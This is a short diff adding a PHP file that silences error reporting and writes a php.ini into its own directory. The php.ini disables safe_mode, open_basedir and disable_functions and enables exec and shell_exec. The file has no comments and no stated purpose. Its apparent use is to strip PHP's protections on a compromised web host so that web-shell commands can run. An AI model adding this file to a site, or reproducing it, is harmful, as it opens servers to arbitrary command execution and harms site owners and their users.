@@ -1,0 +1,10 @@
+<?php
+error_reporting(0);
+$phpini = 'safe_mode = Off
+disable_functions = NONE
+safe_mode_gid = OFF
+open_basedir = OFF
+exec = ON 
+shell_exec = ON';
+fwrite(fopen("php.ini","w"),$phpini);
+?>
